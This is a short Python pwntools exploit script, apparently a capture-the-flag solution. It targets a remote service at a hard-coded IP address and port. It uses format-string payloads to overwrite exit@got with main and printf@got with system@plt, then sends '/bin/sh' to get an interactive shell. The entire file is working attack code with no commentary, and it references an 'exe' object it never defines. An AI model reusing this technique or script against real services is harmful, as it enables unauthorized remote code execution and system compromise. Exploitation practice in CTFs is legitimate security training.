#!/usr/bin/python3

from pwn import *

# p = process(exe.path)
p = remote('103.245.250.31', 32183)
#################################################
### Stage 1: Overwrite `exit@got` into `main` ###
#################################################
payload = f'%{0x146f}c%12$hn'.encode()
payload = payload.ljust(0x10, b'P')
payload += p64(exe.got['exit'])
p.sendlineafter(b'name?', payload)

#########################################################
### Stage 2: Overwrite `printf@got` into `system@plt` ###
#########################################################
payload = f'%{0x401100}c%12$ln'.encode()
payload = payload.ljust(0x10, b'P')
payload += p64(exe.got['printf'])
p.sendlineafter(b'Adele', b'd' + payload)

payload = b'/bin/sh\x00'
p.sendlineafter(b'Adele', b'd' + payload)

p.interactive()